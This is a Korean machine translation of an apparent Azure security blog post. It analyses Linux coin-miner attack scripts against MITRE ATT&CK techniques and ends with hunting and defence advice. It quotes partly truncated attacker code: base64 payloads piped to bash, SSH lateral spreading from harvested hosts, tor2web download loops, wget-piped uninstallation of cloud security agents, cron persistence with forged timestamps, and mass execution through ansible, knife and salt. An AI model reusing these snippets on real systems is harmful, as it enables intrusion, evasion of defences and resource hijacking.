### YamlMime:Yaml
ms.openlocfilehash: 5b8ce55fa34300dca6b6ecd967d9aad2b37a8514
ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 03/11/2022
ms.locfileid: "139906720"
Slug: learning-from-cryptocurrency-mining-attack-scripts-on-linux
Title: Linux의 암호 화폐 마이닝 공격 스크립트에서 Learning
Summary: 암호 화폐 마이닝 공격은 많은 Azure Linux 고객에게 계속 위협이 됩니다.
Content: >-
  <p>암호 화폐 마이닝 공격은 많은 Azure Linux 고객에게 계속 위협이 됩니다. <a href="https://azure.microsoft.com/en-us/blog/leverage-azure-security-center-to-detect-when-compromised-linux-machines-attack/">과거에</a>는 일부 공격자가 무차별 암호 대입 기술을 사용하여 계정 이름과 암호를 추측하고 이를 사용하여 머신에 액세스하는 방법에 대해&#39;설명했습니다. 오늘날 우리는 서비스를 호스팅하는 컴퓨터에서 직접 공격자 코드를 실행하기 위해 서비스가 악용되는 곳을 몇몇 고객이 보았던 공격에 대해 이야기하고&#39;.</p>


  <p>이 공격은 여러 가지 이유로 흥미롭습니다. 공격자는 스크립트에 에코되어 컴퓨터에서 실행되는 작업뿐만 아니라 원하는 작업을 볼 수 있습니다. 스크립트는 캠페인이 얼마나 도달할 수 있는지를 보여 주기 위해 악용할 수 있는 다양한 서비스를 다룹니다. 마지막으로 스크립트 자체가 있으므로 <a href="https://attack.mitre.org/matrices/enterprise/linux/" target="_blank">Linux MITRE ATTCK&amp; 행렬</a> 의 횡적 이동, 방어 회피, 지속성 및 목표 섹션에서 좋은 예제를 가져와서 사용자 고유의 데이터 헌팅에 대해 이야기할 수 있습니다.</p>


  <h2>초기 벡터</h2>


  <p>이 공격의 경우 감사된 로그에서 문제가 있다는 첫 번째 표시는 base64로 인코딩된 명령을 base64로 파이핑하여 디코딩한 다음 bash로 파이핑하는 에코 명령입니다. 사용자 전체에서 이 첫 번째 명령은 인터넷에 노출된 애플리케이션 또는 서비스의 부모 프로세스를 가지며 이 명령은 해당 프로세스와 연결된 사용자 계정에 의해 실행됩니다. 이는 애플리케이션 또는 서비스 자체가 명령을 실행하기 위해 악용되었음을 나타냅니다. 이러한 계정 중 일부는 고객과 관련이 있지만 Ubuntu, Jenkins 및 Hadoop과 같은 일반적인 계정도 사용됩니다.&nbsp;</p>


  <p><code>/bin/sh -c &quot;echo ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYm</code></p>


  <p><code>luOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4K&lt;snip&gt;CmRvbm</code></p>


  <p><code>UK|base64 -d|bash&quot;</code></p>


  <h2>스크립트</h2>


  <p>이 공격자가 스크립트를 사용하는 방법에 대해 간략하게 설명해 두는 것이 좋습니다. 이 경우 base64로 인코딩된 스크립트를 통해 거의 모든 작업을 수행합니다. 이러한 스크립트에 대한 흥미로운 점 중 하나는 표준 오류 및 표준 출력 스트림 <code>/dev/null</code> 을 모두 리디렉션하고 공격자가 일반적으로 실행하려는 시스템 명령을 보유하는 것으로 알고 있는 위치로 경로 변수를 설정하는 것과 같은 처음 두 줄로 시작한다는 것입니다.&nbsp;</p>


  <p><code>exec &amp;&gt;/dev/null<br>

  export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</code></p>


  <p>이는 각 항목이 base64로 인코딩될 때 인코딩의 첫 번째 부분이 매번 동일하다는 것을 나타냅니다.</p>


  <p><code>ZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDovYmluOi9zYmluOi91c3IvYm</code></p>


  <p><code>luOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4K</code></p>


  <p>동일한 명령을 사용하면 대규모 컴퓨터 집합에서 공격을 함께 연결하려고 할 때 특히 유용합니다. 스크립트 자체는 공격자가 실행하려는 의도를 볼 수 있기 때문에 흥미롭습니다. 방어자는 시스템을 조작하는 방법을 확인할 수 있도록 언제든 공격자 스크립트를 보는 것이 매우 중요할 수 있습니다. 예를 들어 이 공격자는 for 루프를 사용하여 가능한 여러 도메인 이름을 순환합니다. 이 유형의 인사이트는 조사 중에 피벗할 수 있는 더 많은 데이터를 수비수에게 제공합니다.</p>


  <p><code>for h in onion.glass civiclink.network tor2web.io onion.sh onion.mn onion.in.net onion.to<br>

  do<br>

  if ! ls /proc/$(cat /tmp/.X11-unix/01)/io; then<br>

  x t&lt;snip&gt;v.$h<br>

  else<br>

  break<br>

  fi<br>

  done</code></p>


  <p>이 공격자가 여러 고객에 걸쳐 30개 이상의 인코딩된 스크립트를 사용하는 것을 확인했지만 실행 파일 이름 또는 다운로드 사이트에 작은 차이가 있는 약 12개의 기본 스크립트로 요약되었습니다. 이러한 스크립트 내에는 LINux용 MITRE ATTCK&amp; 행렬에 직접 연결할 수 있는 몇 가지 흥미로운 예가 있습니다.</p>


  <h2>측면 확대</h2>


  <p>공격자가 가장 먼저 수행하는 작업은 아니지만&rsquo; 흥미로운 조합 검색(<a href="https://attack.mitre.org/techniques/T1018/">T1018: 원격 시스템 검색</a>) 및 횡적 이동(<a href="https://attack.mitre.org/techniques/T1021/">T1021: 원격 서비스</a>) 기술을 사용하여 다른 호스트를 감염합니다. 파일을 <code>.bash_history, /etc/hosts</code>통해 grep하고 <code>.ssh/known_hosts</code> IP 주소를 찾습니다. 그런 다음 루트 계정과 암호 없이 현재 호스트에서 손상된 계정을 사용하여 초기 인코딩된 스크립트를 각 호스트에 전달하려고 시도합니다. 함수는 <code>xssh</code> 원래 스크립트의 호출 앞에 나타납니다.&nbsp;</p>


  <p><code>hosts=$(grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; ~/.bash_history /etc/hosts ~/.ssh/known_hosts |awk -F: {&#39;print $2&#39;}|sort|uniq ;awk {&#39;print $1&#39;} $HOME/.ssh/known_hosts|sort|uniq|grep -v =|sort|uniq)<br>

  for h in $hosts;do xssh root $h; xssh $USER $h &amp; done<br>

  ------<br>

  xssh() {<br>

  ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no $1@$2 &#39;echo ZXhlYyA&lt;snip&gt;KZG9uZQo=|base64 -d|bash&#39;<br>

  }</code></p>


  <p>각각의 경우에서 초기 발판을 얻은 후 공격자는 유사한 방어 회피 기술 집합을 사용합니다.</p>


  <h2>방어 회피</h2>


  <p>다양한 스크립트를 통해 공격자는 <a href="https://attack.mitre.org/techniques/T1107/">T1107: 파일 삭제</a>, <a href="https://attack.mitre.org/techniques/T1222/">T1222: 파일 및 디렉터리 권한 수정</a> 및 <a href="https://attack.mitre.org/techniques/T1089/">T1089: 보안 도구 기술을 사용하지 않도록 설정</a> 하며, 이 시점의 <a href="https://attack.mitre.org/techniques/T1064/">명백한 T1064: 스크립팅</a>을 사용합니다.</p>


  <p>한 스크립트에서 먼저 임의로 명명된 파일을 만듭니다.</p>


  <p><code>z=./$(date|md5sum|cut -f1 -d&quot; &quot;)</code></p>


  <p>실행 파일을 해당 파일에 다운로드한 후 다운로드한 파일을 실행되도록 수정하고 실행한 다음 디스크에서 파일을 삭제합니다.</p>


  <p><code>chmod +x $z;$z;rm -f</code></p>


  <p>다른 스크립트에서 공격자는 Alibaba Cloud Security Server Guard 및 AliCloud CloudMonitor 서비스에 대한 제거 파일을 다운로드한 다음 실행하려고 시도합니다($w 변수는 스크립트의 앞부분에서 wget 명령으로 설정됨).</p>


  <p><code>$w update.aegis.aliyun.com/download/uninstall.sh|bash<br>

  $w update.aegis.aliyun.com/download/quartz_uninstall.sh|bash<br>

  /usr/local/qcloud/stargate/admin/uninstall.sh</code></p>


  <h2>지속성</h2>


  <p>동전 광부가 가동되고 실행되면 이 공격자는 <a href="https://attack.mitre.org/techniques/T1168/">T1168: 로컬 작업 예약</a> 및 <a href="https://attack.mitre.org/techniques/T1501/">T1501: 지속성을 위해 시스템 서비스</a> 예약 작업의 조합을 사용합니다. 아래는 스크립트의 다른 부분에서 가져온 것으로, ntp 호출과 base64로 인코딩된 스크립트 중 하나를 systemd-ntpdate 파일에 에코한 다음, cron 작업을 추가하여 해당 파일을 실행합니다. 여기서 인코딩된 스크립트는 기본적으로 침입을 시작한 원래 스크립트와 동일합니다.</p>


  <p><code>echo -e &quot;#\x21/bin/bash\nexec &amp;&gt;/dev/null\nntpdate ntp.aliyun.com\nsleep $((RANDOM % 600))\necho ZXhlYyAmPi9&lt;snip&gt;2gKZmkK|base64 -d|bash&quot; &gt; /lib/systemd/systemd-ntpdate<br>

  echo &quot;0 * * * * root /lib/systemd/systemd-ntpdate&quot; &gt; /etc/cron.d/0systemd-ntpdate<br>

  touch -r /bin/grep /lib/systemd/systemd-ntpdate<br>

  touch -r /bin/grep /etc/cron.d/0systemd-ntpdate<br>

  chmod +x /lib/systemd/systemd-ntpdate</code></p>


  <h2>목표</h2>


  <p>앞서 언급했듯이, 이 공격자의 주요 목표는 동전 광부를 시작하는 것입니다. <a href="https://attack.mitre.org/techniques/T1496/">T1496: 리소스 하이재킹</a> 전술을 사용하여 실행되는 첫 번째 스크립트에서 이 작업을 수행합니다. 이 공격에 대한 흥미로운 점 중 하나는 처음에 손상된 계정으로 가는 동전 광부를 얻으려고 노력하는 동안 후속 스크립트 중 하나가 다른 소프트웨어 (<a href="https://attack.mitre.org/techniques/T1072/">T1072 : 타사 소프트웨어</a>)의 명령을 사용하여 시작하려고 시도한다는 것입니다.</p>


  <p><code>ansible all -m shell -a &#39;echo ZXh&lt;snip&gt;uZQo=|base64 -d|bash&#39;<br>

  knife ssh &#39;name:*&#39; &#39;echo ZXh&lt;snip&gt;uZQo=|base64 -d|bash&#39;<br>

  salt &#39;*&#39; cmd.run &#39;echo ZXh&lt;snip&gt;ZQo=|base64 -d|bash&#39;</code></p>


  <h2>사냥</h2>


  <p>ASC Linux 고객은 이러한 유형의 활동에서 <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-detect-attacks-against-your-linux-machines/">동전 마이닝</a> 또는 의심스러운 다운로드 경고를 볼 것으로 예상해야하지만 직접 사냥하려면 어떻게해야합니까? 위의 스크립트 예제를 사용하는 경우 특히 명령줄 로깅이 있는 경우 후속 조치를 수행할 수 있는 몇 가지 지표가 있습니다.&nbsp;</p>


  <ul>
      <li>양파 및 토르 사이트에 예기치 않은 연결이 보이나요?</li>
      <li>호스트 간에 예기치 않은 ssh 연결이 보이나요?</li>
      <li>특정 사용자의 활동이 증가하는 것을 볼 수 있나요?</li>
      <li>base64 명령이 에코되고 디코딩된 다음 bash로 파이프되는 것을 볼 수 있나요? 그 중 하나는 자신의 네트워크에 따라 의심 스러운 수 있습니다.</li>
      <li>cron 작업을 확인합니다. wgets 또는 base64로 인코딩된 줄이 보이나요?</li>
      <li>컴퓨터에서 실행 중인 서비스를 확인합니다. 예기치 않은 것이 보이나요?</li>
      <li>위의 목표 섹션을 참조하여 설치하지 않은&rsquo; 소프트웨어에 대한 명령이 표시되는가요?</li>
  </ul>


  <p>Azure Sentinel은 <a href="https://docs.microsoft.com/en-us/azure/sentinel/hunting" target="_blank">헌팅</a> 에도 도움이 될 수 있습니다. Azure Security Center 고객인 경우 Azure Sentinel에 쉽게 <a href="https://techcommunity.microsoft.com/t5/azure-sentinel/integrating-azure-security-center-with-azure-sentinel/ba-p/482847" target="_blank">통합</a> 할 수 있습니다.</p>


  <h2>방어</h2>


  <p>헌팅 외에도 이러한 유형의 공격으로부터 자신을 보호하기 위해 할 수 있는 몇 가지 방법이 있습니다. 인터넷 연결 서비스가 있는 경우 <a href="https://docs.microsoft.com/en-us/azure/automation/automation-tutorial-update-management">최신 상태로</a> 유지하고, 기본 암호를 변경하고, Azure <a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-just-in-time">에서 JIT(Just-In-Time),</a> <a href="https://techcommunity.microsoft.com/t5/Azure-Active-Directory-Identity/Announcing-password-less-login-identity-governance-and-more-for/ba-p/262472">암호 없는 로그인</a> 및 <a href="https://docs.microsoft.com/en-us/azure/key-vault/key-vault-whatis">Azure Key Vault</a>와 같은 다른 자격 증명 관리 도구를 활용하고 있는지 확인합니다. Azure 머신 사용률 모니터링; 예기치 않은 사용량 증가는 동전 광부를 나타낼 수 있습니다. Azure Security Center <a href="https://docs.microsoft.com/en-us/azure/security-center/" target="_blank">설명서 페이지에서</a> 다른 아이디어를 확인하세요.&nbsp;</p>


  <h2>Linux 시스템에 대한 공격 식별</h2>


  <p>동전 광부는 인터넷에 노출 된 기계에 대한 지속적인 위협을 나타냅니다. 일반적으로 알려진 잘못된 IP를 차단하거나 서명 기반 바이러스 백신을 사용하는&#39;있지만 공격자 전술, 기술 및 절차를 연구하여 수비수는 환경을 보호하는 새롭고 신뢰할 수 있는 방법을 찾을 수 있습니다.</p>


  <p>우리는이 게시물에서 특정 동전 광부 공격자에 대해 이야기하는 동안, 위에서 강조 기본 기술은 Linux 시스템의 공격자의 많은 다른 유형에 의해 사용됩니다. 횡적 이동, 방어 회피 및 지속성 기술은 다른 공격자가 정기적으로 사용하는 위와 유사하며 조사에 따라 지속적으로 새로운 탐지를 추가하고 있습니다.</p>
